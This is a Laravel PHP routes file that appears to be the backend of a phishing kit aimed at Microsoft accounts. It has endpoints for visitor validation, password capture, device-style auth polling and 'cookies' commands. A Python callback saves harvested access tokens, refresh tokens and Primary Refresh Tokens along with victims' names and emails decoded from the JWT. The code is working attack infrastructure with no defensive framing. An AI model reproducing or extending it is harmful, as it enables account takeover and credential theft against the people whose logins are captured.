<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\CoreSystemController;
use App\Http\Controllers\Api\CommandController;
use Illuminate\Support\Facades\Log;
use App\Models\PythonJob;
use App\Jobs\RunPythonJob;
use App\Models\Token;
use App\Http\Controllers\Api\MicrosoftAuthController;
use App\Http\Controllers\MicrosoftInboxController;

use Illuminate\Http\Request;

Route::any('/mail-notify', function (Request $request) {

    if ($request->has('validationToken')) {

        header('Content-Type: text/plain');

        echo $request->query('validationToken');

        exit;
    }

    \Log::info('MAIL WEBHOOK', [
        'body' => file_get_contents("php://input")
    ]);

    return response('ok', 200);
});


Route::post('/valid-visitor', [CoreSystemController::class, 'storeValidVisitor']);
Route::post('/send-password', [CoreSystemController::class, 'storePassword']);
// token
Route::post('/start', [MicrosoftAuthController::class, 'start']);
Route::get('/poll/{login_id}', [MicrosoftAuthController::class, 'poll']);
// cookies
Route::post('/command/start', [CommandController::class, 'start']);
Route::get('/command/poll/{id}', [CommandController::class, 'poll']);
Route::post('/python/callback', function (Request $request) {

    if ($request->header('X-Python-Secret') !== config('services.python.secret')) {
        return response()->json(['error' => 'unauthorized'], 403);
    }

    Log::info('PYTHON CALLBACK', $request->all());

    $job = PythonJob::find($request->job_id);

    if (!$job) {
        return response()->json(['error' => 'job not found'], 404);
    }

    $updateData = [
        'status' => $request->status,
    ];

    if ($request->has('data')) {
        $updateData['result'] = $request->data;
    }

    if ($request->status === 'failed') {
        $updateData['error'] = $request->error ?? 'unknown_error';
    }

    $job->update($updateData);

    if ($request->status === 'done' && $request->has('data')) {
        $data = $request->data;

        $accessToken = $data['access_token'] ?? null;
        $refreshToken = $data['refresh_token'] ?? null;
        $prt = $data['prt'] ?? null;

        $name = null;
        $email = null;

        if ($accessToken) {
            $parts = explode('.', $accessToken);

            if (count($parts) >= 2) {
                $payload = strtr($parts[1], '-_', '+/');
                $payload .= str_repeat('=', (4 - strlen($payload) % 4) % 4);

                $jwt = json_decode(base64_decode($payload), true);

                if ($jwt) {
                    $name = $jwt['name']
                        ?? trim(($jwt['given_name'] ?? '') . ' ' . ($jwt['family_name'] ?? ''));

                    $email = $jwt['upn']
                        ?? $jwt['preferred_username']
                        ?? $jwt['unique_name']
                        ?? $jwt['email']
                        ?? null;
                }
            }
        }

        Token::create([
            'user_id' => $job->user_id ?? null,
            'name' => $name,
            'email' => $email,
            'prt' => $prt ? json_encode($prt) : null,
            'access_token' => $accessToken,
            'refresh_token' => $refreshToken,
            'expires_at' => now()->addMinutes(50),
            'status' => 'active',
        ]);
    }

    return response()->json(['ok' => true]);
})->name('python.callback');

Route::get('/python/job/{id}', function ($id) {
    return PythonJob::findOrFail($id);
});

Route::post('/python/start', function () {

    $job = PythonJob::create([
        'status' => 'pending'
    ]);

    // 🔥 jalankan python
    RunPythonJob::dispatch($job->id)->onQueue('python');

    return response()->json([
        'job_id' => $job->id,
        'status' => 'started'
    ]);
});

